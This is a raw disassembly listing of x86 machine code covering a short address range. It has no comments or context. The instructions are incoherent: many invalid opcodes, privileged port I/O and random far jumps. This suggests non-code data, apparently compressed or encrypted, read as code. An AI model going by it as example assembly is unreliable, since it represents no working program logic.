  4182df:	jbe    0x418356
  4182e1:	dec    ebx
  4182e2:	ja     0x41829b
  4182e4:	ss and eax,0xa4ce76f2
  4182ea:	and    eax,0x44c35871
  4182ef:	icebp  
  4182f0:	push   cs
  4182f1:	loopne 0x418357
  4182f3:	xor    al,BYTE PTR [ebx]
  4182f5:	bound  ebx,QWORD PTR [esi-0x262b3a52]
  4182fb:	or     ah,BYTE PTR [eax+0x13]
  4182fe:	mov    BYTE PTR [esi-0x36732e19],0xa0
  418305:	mov    ecx,0x13cdff96
  41830a:	cwde   
  41830b:	imul   edx,DWORD PTR [edi+0x13],0xffffffdf
  41830f:	mov    edi,0x64aea060
  418314:	xor    al,0x1e
  418316:	aaa    
  418317:	xor    eax,0xb48f42a3
  41831c:	cdq    
  41831d:	retf   
  41831e:	shl    DWORD PTR [ebx],cl
  418320:	in     al,0xcd
  418322:	push   ebp
  418323:	cli    
  418324:	sahf   
  418325:	push   0xc5f71bf8
  41832a:	ja     0x418300
  41832c:	pop    edi
  41832d:	retf   0x6235
  418330:	add    DWORD PTR [eax+0x1d6f8c95],esp
  418336:	scas   eax,DWORD PTR es:[edi]
  418337:	popa   
  418338:	stos   DWORD PTR es:[edi],eax
  418339:	pop    ecx
  41833a:	push   esi
  41833b:	cdq    
  41833c:	arpl   WORD PTR [esi],ax
  41833e:	xlat   BYTE PTR ds:[ebx]
  41833f:	jge    0x418372
  418341:	daa    
  418342:	ds jge 0x4183a1
  418345:	ins    DWORD PTR es:[edi],dx
  418346:	loop   0x4183bf
  418348:	inc    esi
  418349:	xchg   ebx,eax
  41834a:	pop    edi
  41834b:	adc    al,0xb7
  41834d:	push   ds
  41834e:	mov    esi,DWORD PTR [edi-0x1a4e3641]
  418354:	sti    
  418355:	out    dx,al
  418356:	ror    BYTE PTR [esp+eiz*8-0x736f5d02],cl
  41835d:	cld    
  41835e:	push   ecx
  41835f:	ret    0x47b
  418362:	dec    ebx
  418363:	push   edi
  418364:	push   esp
  418365:	cmp    al,BYTE PTR [ebp-0x27]
  418368:	test   eax,0xaeee46a8
  41836d:	push   esi
  41836e:	fcmovne st,st(4)
  418370:	push   ebx
  418371:	pop    ebx
  418372:	mov    esi,0x155144bf
  418377:	jnp    0x4183eb
  418379:	sub    ebp,edx
  41837b:	sbb    bh,BYTE PTR [edi+eax*8]
  41837e:	xchg   ebx,eax
  41837f:	(bad)  
  418381:	add    DWORD PTR [edx],eax
  418383:	sbb    BYTE PTR [eax-0x2294000f],cl
  418389:	jne    0x41830c
  41838b:	lds    edx,FWORD PTR [ecx]
  41838d:	cld    
  41838e:	lahf   
  41838f:	test   BYTE PTR [eax],al
	...
  4183f1:	add    BYTE PTR [eax],al
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	push   0x943fe546
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	mov    ch,0x1f
  41840e:	addr16 pop edi
  418410:	mov    eax,0x79ff3253
  418415:	cmp    bh,al
  418417:	add    eax,0x81f0fe81
  41841c:	mov    edx,ebp
  41841e:	pop    esp
  41841f:	aad    0xd3
  418421:	mov    bl,0xea
  418423:	ins    DWORD PTR es:[edi],dx
  418424:	(bad)  
  418425:	(bad)  
  418427:	xchg   esp,eax
  418428:	and    DWORD PTR [esp+esi*8-0x2b],edx
  41842c:	sbb    bh,BYTE PTR [esi+0x52]
  41842f:	inc    esi
  418430:	push   eax
  418431:	push   edx
  418432:	lock pop ebp
  418434:	retf   0xd244
  418437:	push   esp
  418438:	fsubr  DWORD PTR [esi]
  41843a:	shr    DWORD PTR fs:[ecx-0x6e],cl
  41843e:	aaa    
  41843f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418440:	imul   ebp,ebp,0xffffff93
  418443:	cmp    al,0xae
  418445:	cs gs std 
  418448:	push   ss
  418449:	push   esp
  41844a:	or     ebx,DWORD PTR [edx+0x75be7bdf]
  418450:	ficom  DWORD PTR [edi+0x1225c199]
  418456:	mov    dh,0xb0
  418458:	inc    esp
  418459:	mov    edx,DWORD PTR [ebp-0x37db0c73]
  41845f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418460:	push   eax
  418461:	in     eax,0x90
  418463:	push   ss
  418464:	cmc    
  418465:	in     al,0x82
  418467:	ds ret 0xf7cf
  41846b:	rcl    edx,1
  41846d:	je     0x41844e
  41846f:	mov    ecx,0xc678aaac
  418474:	sub    DWORD PTR [edx+0x3a84bdb9],esi
  41847a:	sbb    eax,0x46af5a24
  41847f:	aas    
  418480:	dec    edx
  418481:	pusha  
  418482:	pushf  
  418483:	(bad)  
  418484:	adc    dh,dh
  418486:	mov    ah,0x10
  418488:	mov    ebx,0xea4b1f7f
  41848d:	aaa    
  41848e:	nop
  41848f:	and    DWORD PTR [ebp*2+0x44851717],ebp
  418496:	aad    0x66
  418498:	outs   dx,BYTE PTR ds:[esi]
  418499:	jp     0x418508
  41849b:	sub    al,0x14
  41849d:	sbb    DWORD PTR [eax+0x20],ebx
  4184a0:	xor    DWORD PTR [edi-0x13],0x5c37718a
  4184a7:	(bad)  
  4184a8:	xlat   BYTE PTR ds:[ebx]
  4184a9:	cdq    
  4184aa:	ret    
  4184ab:	sbb    BYTE PTR [edi-0x1626640f],ch
  4184b1:	repz pop eax
  4184b3:	and    BYTE PTR [edx],ch
  4184b5:	adc    al,0x1b
  4184b7:	jne    0x4184bc
  4184b9:	sbb    DWORD PTR [ecx],0x9a9b6d6e
  4184bf:	or     esi,DWORD PTR [esi+edx*1]
  4184c2:	pushf  
  4184c3:	nop
  4184c4:	xchg   esp,eax
  4184c5:	mov    dh,0x76
  4184c7:	iret   
  4184c8:	stos   DWORD PTR es:[edi],eax
  4184c9:	inc    eax
  4184ca:	out    dx,al
  4184cb:	je     0x41845e
  4184cd:	mov    ebx,0x4a0abbbc
  4184d2:	push   0x6d07240c
  4184d7:	icebp  
  4184d8:	sti    
  4184d9:	mov    dl,0xce
  4184db:	in     eax,0xe8
  4184dd:	fsub   QWORD PTR [esi+esi*4-0x639022f2]
  4184e4:	mov    ch,BYTE PTR [edi]
  4184e6:	mov    BYTE PTR [ebx+eiz*2+0x2194723f],ah
  4184ed:	jne    0x4184d7
  4184ef:	add    ebx,DWORD PTR [ebp-0x4cf3c45c]
  4184f5:	jge    0x4184a5
  4184f7:	cli    
  4184f8:	je     0x4184de
  4184fa:	gs in  al,dx
  4184fc:	rcl    BYTE PTR [eax+0x1fffaecc],cl
  418502:	pusha  
  418503:	mov    ?,WORD PTR [ebp-0x31]
  418506:	arpl   sp,ax
  418508:	fdivr  QWORD PTR [edi+0x56]
  41850b:	ins    DWORD PTR es:[edi],dx
  41850c:	inc    edx
  41850d:	sbb    ah,BYTE PTR [eax]
  41850f:	mov    dl,0x0
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	xor    BYTE PTR [ecx],0xa
  418583:	jns    0x41851d
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	shl    ebp,cl
  41858e:	mov    cl,0x90
  418590:	fst    DWORD PTR [esi+0x43]
  418593:	ins    DWORD PTR es:[edi],dx
  418594:	pop    esp
  418595:	pop    ss
  418596:	mov    edx,0x17214c8
  41859b:	mov    ebp,0x85a7f5dc
  4185a0:	mov    esp,0xa66f2a6c
  4185a5:	push   eax
  4185a6:	ret    
  4185a7:	push   edx
  4185a8:	int3   
  4185a9:	scas   al,BYTE PTR es:[edi]
  4185aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ab:	in     al,dx
  4185ac:	inc    ebp
  4185ad:	push   ss
  4185ae:	pop    edi
  4185af:	nop
  4185b0:	pop    ss
  4185b1:	mov    bl,0x8c
  4185b3:	into   
  4185b4:	jl     0x4185a9
  4185b6:	lahf   
  4185b7:	pmaddwd mm6,QWORD PTR [esi+0x2f22bc21]
  4185be:	xchg   edx,eax
  4185bf:	mov    bl,0x52
  4185c1:	imul   ebp,DWORD PTR [eax-0x57c3475],0xad781865
  4185cb:	or     BYTE PTR [ecx+0x6d],cl
  4185ce:	aam    0xbd
  4185d0:	sub    eax,0xbcb46ef7
  4185d5:	fnsave [edi-0x432b305d]
  4185db:	sbb    al,0xb7
  4185dd:	mov    ebx,0x93d885e9
  4185e2:	add    al,0xe3
  4185e4:	retf   
  4185e5:	outs   dx,BYTE PTR ds:[esi]
  4185e6:	mov    ds:0x215a16f8,al
  4185eb:	or     bh,dh
  4185ed:	popa   
  4185ee:	mov    bh,BYTE PTR [edi]
  4185f0:	xchg   ebp,eax
  4185f1:	dec    esi
  4185f2:	int    0x42
  4185f4:	mov    ebx,0xd3e83435
  4185f9:	mov    ah,BYTE PTR [edx+eax*1+0xbb8e1be]
  418600:	or     DWORD PTR [eax-0x4c],esp
  418603:	inc    esp
  418604:	ror    DWORD PTR [edi+0x53ce7fd9],cl
  41860a:	div    BYTE PTR [esp+eax*1+0x2b]
  41860e:	sbb    ah,ch
  418610:	int    0xc1
  418612:	pop    ss
  418613:	test   al,0xb8
  418615:	sub    dl,dl
  418617:	dec    eax
  418618:	jno    0x41860f
  41861a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41861b:	or     ah,BYTE PTR ds:0x8c7bd86d
  418621:	jbe    0x4185e9
  418623:	jae    0x418619
  418625:	mov    cl,0xa8
  418627:	jae    0x418692
  418629:	push   edx
  41862a:	or     eax,DWORD PTR [ebx+edx*1-0x79]
  41862e:	aam    0xde
  418630:	or     eax,ebp
  418632:	into   
  418633:	fcmovnu st,st(1)
  418635:	mov    edi,0x28148d71
  41863a:	es inc ecx
  41863c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41863d:	or     ebp,esp
  41863f:	and    dh,BYTE PTR [edx]
  418641:	sbb    esi,DWORD PTR ds:0x1ca48770
  418647:	nop
  418648:	retf   
  418649:	(bad)  
  41864a:	jmp    0x41861c
  41864c:	fs mov cl,0x17
  41864f:	mov    eax,0x2ae699ab
  418654:	mov    esi,0xc14f967e
  418659:	ss jecxz 0x41861a
  41865c:	addr16 nop
  41865e:	dec    ebx
  41865f:	enter  0x4f57,0x71
  418663:	mov    ch,0xa2
  418665:	dec    ebp
  418666:	test   eax,0x893e8905
  41866b:	mov    eax,ds:0x582343d4
  418670:	xchg   dl,bl
  418672:	cld    
  418673:	xchg   BYTE PTR [ebx+0x27365499],dl
  418679:	mov    bl,0x93
  41867b:	push   cs
  41867c:	sub    DWORD PTR [eax],edx
  41867e:	sar    BYTE PTR [ecx-0x68ce6e5b],1
  418684:	cmp    cl,BYTE PTR [ecx-0x2f]
  418687:	call   0x70e93db
  41868c:	adc    DWORD PTR es:[edi+0x33],ecx
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	gs lock call 0x400:0x1029c84
  418709:	add    DWORD PTR [eax],eax
  41870b:	add    ah,dl
  41870d:	lock and eax,DWORD PTR [esi]
  418710:	mov    bl,0xbf
  418712:	push   edx
  418713:	pop    ss
  418714:	aad    0xb6
  418716:	pop    eax
  418717:	sahf   
  418718:	test   dh,ch
  41871a:	mov    edi,0x44275f01
  41871f:	xor    edx,0x82f01acf
  418725:	mov    edx,0x2bb5d1b6
  41872a:	fsubr  QWORD PTR [eax+0x63]
  41872d:	jmp    esp
  41872f:	push   ebx
  418730:	outs   dx,BYTE PTR ds:[esi]
  418731:	ja     0x41870d
  418733:	lahf   
  418734:	(bad)  
  418735:	sub    ebx,DWORD PTR [edi-0x75]
  418738:	and    ah,BYTE PTR [ecx+eiz*8+0x72e7673d]
  41873f:	out    dx,eax
  418740:	or     DWORD PTR [edi-0x1d682817],0xb5f60ffd
  41874a:	das    
  41874b:	vpsrlvd ymm2,ymm4,YMMWORD PTR [ebp+eax*8+0x6cbab4]
  418755:	out    0x6f,eax
  418757:	mov    bl,0xab
  418759:	inc    ebx
  41875a:	cmp    DWORD PTR [ebx-0x69],0xffffffe6
  41875e:	push   ebx
  41875f:	sub    edx,DWORD PTR [esi]
  418761:	mov    DWORD PTR [eax+0x6c],edi
  418764:	ins    DWORD PTR es:[edi],dx
  418765:	sub    edi,ebx
  418767:	cmc    
  418768:	jecxz  0x4187b1
  41876a:	lahf   
  41876b:	sbb    al,0x7d
  41876d:	mov    ah,0xe6
  41876f:	icebp  
  418770:	pusha  
  418771:	jecxz  0x418778
  418773:	xor    cl,BYTE PTR [bx+di+0x18e4]
  418778:	je     0x4187d1
  41877a:	xchg   ebp,eax
  41877b:	test   al,0x89
  41877d:	stc    
  41877e:	inc    edi
  41877f:	sbb    BYTE PTR [ebx+0x6e],0x1e
  418783:	mov    ds:0x2202798,eax
  418788:	jo     0x4187de
  41878a:	add    BYTE PTR [ebp-0x45],ch
  41878d:	sti    
  41878e:	mov    dx,0xb6a8
  418792:	mov    bl,0xef
  418794:	or     dh,BYTE PTR cs:[edx-0x239ce620]
  41879b:	bound  esp,QWORD PTR [ebp+0x77]
  41879e:	mov    eax,0x74c2c034
  4187a3:	ds adc al,0x45
  4187a6:	inc    ecx
  4187a7:	cmc    
  4187a8:	sub    ecx,DWORD PTR [edx-0x41ab8f18]
  4187ae:	jmp    0xab71:0xcc0f7bc
  4187b5:	mov    ah,0xf7
  4187b7:	out    dx,al
  4187b8:	pop    eax
  4187b9:	fisub  DWORD PTR [eax-0x2ff1ef00]
  4187bf:	outs   dx,DWORD PTR ds:[esi]
  4187c0:	jb     0x4187f5
  4187c2:	push   ebx
  4187c3:	jp     0x418763
  4187c5:	and    DWORD PTR [edi-0x24f772a7],esi
  4187cb:	push   ds
  4187cc:	push   esi
  4187cd:	loopne 0x418840
  4187cf:	mov    BYTE PTR [ecx-0x5f27ddec],ah
  4187d5:	enter  0x1070,0x79
  4187d9:	sbb    eax,0x16ff4ff7
  4187de:	fld    TBYTE PTR [ebx+0xe9cdb6d]
  4187e4:	pop    ebx
  4187e5:	test   BYTE PTR [esp+eiz*8+0x53],0x2f
  4187ea:	or     esp,DWORD PTR [ebp+0x398ad914]
  4187f0:	or     ecx,DWORD PTR [esi]
  4187f2:	mov    WORD PTR [ebp-0x7e],?
  4187f5:	add    DWORD PTR [ebp+0x66514592],ebp
  4187fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187fc:	test   DWORD PTR [ecx-0x42],esi
  4187ff:	mov    ebp,0xb205b2cb
  418804:	out    0x7c,al
  418806:	xchg   DWORD PTR [esi+0x7adfc484],ebx
  41880c:	push   eax
  41880d:	sub    al,0xc0
  41880f:	lea    eax,[eax]
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi+0x409c3acd]
  418881:	add    bl,dl
  418883:	mov    bh,0xa0
  418885:	add    eax,DWORD PTR [ecx]
  418887:	add    BYTE PTR [ecx+eax*1],al
  41888a:	add    BYTE PTR [eax],al
  41888c:	in     al,dx
  41888d:	stos   DWORD PTR es:[edi],eax
  41888e:	inc    edx
  41888f:	outs   dx,BYTE PTR ds:[esi]
  418890:	mov    dl,0xd
  418892:	fistp  DWORD PTR [ebx-0x61bd0cc0]
  418898:	fiadd  WORD PTR [eax+0xb]
  41889b:	sbb    cl,BYTE PTR [edi-0x36]
  41889e:	hlt    
  41889f:	push   ebx
  4188a0:	aas    
  4188a1:	dec    esi
  4188a2:	aad    0x0
  4188a4:	mov    eax,?
  4188a6:	(bad)  
  4188a7:	pop    ebx
  4188a8:	jl     0x418915
  4188aa:	jl     0x41885c
  4188ac:	stos   DWORD PTR es:[edi],eax
  4188ad:	nop
  4188ae:	mov    al,ds:0x2c344e57
  4188b3:	aas    
  4188b4:	xchg   BYTE PTR [edi+0x317702c3],ch
  4188ba:	add    ch,BYTE PTR [edx+0x6e]
  4188bd:	and    DWORD PTR [edi-0x657a7c1f],ebx
  4188c3:	mov    edi,0x63780e9b
  4188c8:	in     eax,dx
  4188c9:	add    ch,BYTE PTR [ecx*8-0x455ee115]
  4188d0:	xor    DWORD PTR [edi+0x768a5b54],ecx
  4188d6:	push   0x30
  4188d8:	stos   DWORD PTR es:[edi],eax
  4188d9:	cwde   
  4188da:	push   ecx
  4188db:	mov    es,WORD PTR [ebp+0x198f2bea]
  4188e1:	daa    
  4188e2:	inc    esp
  4188e3:	inc    ebx
  4188e4:	outs   dx,DWORD PTR ds:[esi]
  4188e5:	mov    ebp,DWORD PTR [ecx+0xc7d3c8b]
  4188eb:	mov    ah,0x9a
  4188ed:	(bad)  
  4188ee:	jmp    0x41887b
  4188f0:	lea    esp,[esi]
  4188f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f3:	int    0x8
  4188f5:	inc    ebx
  4188f6:	cmp    BYTE PTR [ecx-0x59897e3e],cl
  4188fc:	(bad)  
  4188fd:	retf   
  4188fe:	and    DWORD PTR [esi-0x57931459],esi
  418904:	fucomp st(5)
  418906:	mov    esi,0x153e5270
  41890b:	jg     0x4188eb
  41890d:	mov    bl,BYTE PTR [eax]
  41890f:	test   eax,0xcda5440b
  418914:	mov    eax,0x341524b9
  418919:	mov    eax,cs
  41891b:	cmc    
  41891c:	and    BYTE PTR [edx-0x59dd962b],al
  418922:	inc    ecx
  418923:	arpl   WORD PTR [esi+0x11e48479],si
  418929:	std    
  41892a:	jp     0x4188d6
  41892c:	out    0x61,al
  41892e:	loop   0x4189a9
  418930:	mul    DWORD PTR [esi]
  418932:	call   0x4bb7c546
  418937:	loope  0x418966
  418939:	jl     0x418914
  41893b:	fmul   QWORD PTR [esp-0x2d]
  41893f:	jno    0x4188fd
  418941:	adc    eax,0x57baad5a
  418946:	inc    esp
  418947:	mov    DWORD PTR [esi],eax
  418949:	(bad)  
  41894a:	prefetcht2 BYTE PTR [ecx-0x6d511f17]
  418951:	sbb    DWORD PTR [edx-0x237109f0],0xffffffc6
  418958:	ret    
  418959:	lea    esp,[edi]
  41895b:	aas    
  41895c:	sbb    edi,DWORD PTR [edx+0x2a34ee7c]
  418962:	inc    esp
  418963:	adc    bh,BYTE PTR [eax+0x6f]
  418966:	dec    esi
  418967:	jmp    0x1acb:0x2dece8c6
  41896e:	xchg   esi,eax
  41896f:	sbb    al,0x7f
  418971:	and    edx,DWORD PTR [esi+0x51240e9f]
  418977:	sbb    DWORD PTR [ecx-0x78a37020],esp
  41897d:	sahf   
  41897e:	in     eax,0xaf
  418980:	and    dh,dh
  418982:	lahf   
  418983:	add    ebp,DWORD PTR [edi]
  418985:	les    edx,FWORD PTR [esi+0x2da1ae65]
  41898b:	retf   0x6646
  41898e:	sbb    BYTE PTR [esi+0x0],al
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x6c8a1569
  418a03:	shld   DWORD PTR [ecx+eax*1],eax,0x0
  418a08:	add    al,0x1
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	cli    
  418a0d:	dec    ebp
  418a0e:	cmp    DWORD PTR [ebx-0x30194aac],edi
  418a14:	mov    ch,0xb1
  418a16:	dec    edi
  418a17:	fwait
  418a18:	xchg   ebx,eax
  418a19:	xchg   esp,eax
  418a1a:	jmp    0xe02276f3
  418a1f:	add    esi,ecx
  418a21:	neg    BYTE PTR [esi-0x2ee4a152]
  418a27:	mov    eax,0xe0c8719c
  418a2c:	(bad)  
  418a2d:	repz es dec ecx
  418a30:	ss push ecx
  418a32:	add    al,0x1b
  418a34:	dec    ecx
  418a35:	iret   
  418a36:	cwde   
  418a37:	push   ds
  418a38:	ds inc edx
  418a3a:	aam    0xd0
  418a3c:	(bad)  
  418a3d:	in     eax,dx
  418a3e:	mov    esi,0x2f9987fa
  418a43:	das    
  418a44:	cld    
  418a45:	dec    eax
  418a46:	in     al,0x33
  418a48:	mov    eax,0xc76bc462
  418a4d:	push   es
  418a4e:	shr    DWORD PTR [esi-0x39fade75],1
  418a54:	xchg   ah,ch
  418a56:	(bad)  
  418a57:	jo     0x418abe
  418a59:	push   ebp
  418a5a:	pop    esi
  418a5b:	mov    ecx,0x6265aa0e
  418a60:	add    BYTE PTR [edx+0x1e],cl
  418a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a64:	pop    ss
  418a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a66:	ins    DWORD PTR es:[edi],dx
  418a67:	or     bh,dh
  418a69:	jl     0x418abc
  418a6b:	inc    ebp
  418a6c:	jne    0x418a4f
  418a6e:	and    al,0xe1
  418a70:	xor    al,0x31
  418a72:	icebp  
  418a73:	(bad)  [edi-0x32894c5a]
  418a79:	fadd   DWORD PTR [ebx-0x4f7dd27a]
  418a7f:	inc    esi
  418a80:	mov    eax,ds:0x4fe8705c
  418a85:	sub    DWORD PTR [ecx+eiz*2],0xffffffff
  418a89:	push   ebx
  418a8a:	lahf   
  418a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a8c:	inc    edx
  418a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a8e:	jecxz  0x418a21
  418a90:	push   ebx
  418a91:	push   ebp
  418a92:	jno    0x418a67
  418a94:	icebp  
  418a95:	xchg   edi,eax
  418a96:	aad    0x75
  418a98:	and    eax,0x13dbf13
  418a9d:	mov    esp,0xf386562
  418aa2:	ins    BYTE PTR es:[edi],dx
  418aa3:	cmp    eax,0xf0f500e0
  418aa8:	int3   
  418aa9:	jae    0x418a5d
  418aab:	test   BYTE PTR [ebx],dh
  418aad:	loopne 0x418aec
  418aaf:	sub    eax,0x8d7b6871
  418ab4:	dec    ecx
  418ab5:	js     0x418b14
  418ab7:	cmp    eax,0x7b6f69ac
  418abc:	mov    bh,0xfe
  418abe:	pop    eax
  418abf:	xor    esi,DWORD PTR [esi-0x2a50e20b]
  418ac5:	out    0xc8,al
  418ac7:	std    
  418ac8:	test   DWORD PTR [edi],ebp
  418aca:	scas   eax,DWORD PTR es:[edi]
  418acb:	int3   
  418acc:	jns    0x418a95
  418ace:	add    ebp,ecx
  418ad0:	into   
  418ad1:	not    BYTE PTR [edi-0x54]
  418ad4:	xchg   ebx,eax
  418ad5:	pop    ss
  418ad6:	ret    0x507e
  418ad9:	arpl   WORD PTR [edi],di
  418adb:	xchg   ah,ch
  418add:	xchg   bl,cl
  418adf:	xor    al,0xd2
  418ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ae3:	aas    
  418ae4:	xchg   ecx,eax
  418ae5:	and    bl,BYTE PTR [eax+esi*8]
  418ae8:	gs push ebp
  418aea:	pop    ss
  418aeb:	add    eax,0x127274d2
  418af0:	int    0x68
  418af2:	js     0x418aac
  418af4:	pop    edi
  418af5:	sub    esp,DWORD PTR [eax-0xf]
  418af8:	dec    edx
  418af9:	(bad)  
  418afa:	mov    es,WORD PTR [eax-0x71]
  418afd:	data16 mov ah,0xd7
  418b00:	data16 jmp 0x418aa2
  418b03:	xor    al,0x18
  418b05:	push   edi
  418b06:	mov    edi,0xfee11f07
  418b0b:	ret    
  418b0c:	std    
  418b0d:	shl    BYTE PTR es:[edx],0x0
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x7
  418b81:	fwait
  418b82:	dec    edx
  418b83:	nop
  418b84:	test   al,0x5
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	cmc    
  418b8d:	les    ebp,FWORD PTR [ebx-0x7ab39ebd]
  418b93:	sbb    BYTE PTR [esi+0x5],bl
  418b96:	pop    ebx
  418b97:	mov    edx,0xdc5d87c9
  418b9c:	dec    esi
  418b9d:	mov    esi,ebp
  418b9f:	lods   al,BYTE PTR ds:[esi]
  418ba0:	or     eax,0x68a99ceb
  418ba5:	dec    eax
  418ba6:	icebp  
  418ba7:	mov    ds:0xdb1360f7,al
  418bac:	or     DWORD PTR [esi+0x40],0x545395ba
  418bb3:	adc    ch,BYTE PTR [ecx-0xf]
  418bb6:	ins    BYTE PTR es:[edi],dx
  418bb7:	mov    ah,0xf5
  418bb9:	retf   0x5af8
  418bbc:	cli    
  418bbd:	mov    al,0xc
  418bbf:	fstp   QWORD PTR [ebx+0x3f]
  418bc2:	jb     0x418b83
  418bc4:	lahf   
  418bc5:	lds    ebx,FWORD PTR [ecx-0x4d]
  418bc8:	sub    DWORD PTR [edx],esi
  418bca:	sub    BYTE PTR [ecx+0x66],cl
  418bcd:	rcl    esi,cl
  418bcf:	sbb    edx,DWORD PTR [ebp+0x586e0743]
  418bd5:	jne    0x418c29
  418bd7:	(bad)  
  418bd8:	xor    al,ch
  418bda:	call   0xb0a9:0x8ca393f2
  418be1:	ror    BYTE PTR [ebx-0x5ee0e672],0x5d
  418be8:	sbb    BYTE PTR [esi-0x6b],dh
  418beb:	push   cs
  418bec:	leave  
  418bed:	ficomp DWORD PTR [eax+0x663ab4fb]
  418bf3:	xor    BYTE PTR [ecx-0x79],cl
  418bf6:	jp     0x418c74
  418bf8:	pop    eax
  418bf9:	popa   
  418bfa:	outs   dx,BYTE PTR ds:[esi]
  418bfc:	aaa    
  418bfd:	in     eax,dx
  418bfe:	push   edi
  418bff:	fdivr  QWORD PTR [ebx-0x3511dcba]
  418c05:	in     al,dx
  418c06:	(bad)  
  418c07:	mov    dh,0xce
  418c09:	sub    al,0xcc
  418c0b:	adc    eax,0xb67495c4
  418c10:	mov    ebx,DWORD PTR [eax-0x2be28d96]
  418c16:	mov    eax,0xf2e5dcd0
  418c1b:	sub    BYTE PTR [ebx-0x8],0x27
  418c1f:	(bad)  
  418c20:	adc    esp,DWORD PTR [eax]
  418c22:	sbb    eax,0xd2120403
  418c27:	dec    esi
  418c28:	sub    BYTE PTR ds:0x539f6b8d,bl
  418c2e:	loope  0x418c11
  418c30:	fisttp DWORD PTR [ecx+0x30]
  418c33:	aas    
  418c34:	pop    DWORD PTR [ebx+ebx*1]
  418c37:	inc    ebx
  418c38:	inc    ecx
  418c39:	bound  esp,QWORD PTR [esi+0x26]
  418c3c:	xchg   esi,eax
  418c3d:	adc    ebx,DWORD PTR [edx-0x4b]
  418c40:	jo     0x418c2b
  418c42:	shl    BYTE PTR [ebp-0x68],0x82
  418c46:	stc    
  418c47:	dec    eax
  418c48:	push   esi
  418c49:	in     eax,0x9c
  418c4b:	dec    edx
  418c4c:	call   0xc751:0x10647773
  418c53:	shl    ebp,1
  418c55:	xchg   ebx,eax
  418c56:	in     eax,dx
  418c57:	mov    bh,0x9d
  418c59:	sbb    edi,DWORD PTR [ebx+0x76d6588c]
  418c5f:	inc    edi
  418c60:	loope  0x418bfc
  418c62:	dec    eax
  418c63:	out    dx,al
  418c64:	add    bh,BYTE PTR [edi-0x14]
  418c67:	sub    eax,0x9940fdce
  418c6c:	add    eax,0x9e8daafe
  418c71:	out    0xa1,al
  418c73:	(bad)  
  418c75:	inc    ebx
  418c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c77:	in     eax,0xed
  418c79:	pop    ebx
  418c7a:	aad    0x8c
  418c7c:	sar    BYTE PTR [edx+0x33da4354],cl
  418c82:	sub    dl,BYTE PTR [ebx]
  418c84:	sub    eax,0x37fcb0cd
  418c89:	fs dec eax
  418c8b:	cli    
  418c8c:	mov    ebp,0xbe91f0
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	sar    al,cl
  418d01:	or     esp,ecx
  418d03:	sbb    DWORD PTR [esi+eax*1+0x1040001],ebp
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	mov    esp,0x7d64c9f4
  418d11:	xor    ebp,ecx
  418d13:	add    DWORD PTR [eax+ecx*2+0x4ff6265c],esi
  418d1a:	sbb    ebx,esp
  418d1c:	inc    esp
  418d1d:	fwait
  418d1e:	ins    DWORD PTR es:[edi],dx
  418d1f:	xor    DWORD PTR [ecx+0x7d61ef6c],0xffffffaf
  418d26:	popa   
  418d27:	jns    0x418d44
  418d29:	das    
  418d2a:	lods   al,BYTE PTR ds:[esi]
  418d2b:	adc    DWORD PTR [eax+esi*8+0x219347fc],esi
  418d32:	hlt    
  418d33:	bnd jo 0x418d92
  418d36:	addr16 test eax,0x95e451cb
  418d3c:	outs   dx,DWORD PTR ds:[esi]
  418d3d:	push   ds
  418d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d3f:	xor    cl,ch
  418d41:	jo     0x418d46
  418d43:	push   ebp
  418d44:	or     BYTE PTR [edx+ebp*8+0x4c],cl
  418d48:	mov    al,ds:0x8185ae48
  418d4e:	div    al
  418d50:	or     cl,BYTE PTR [ecx+0x7a]
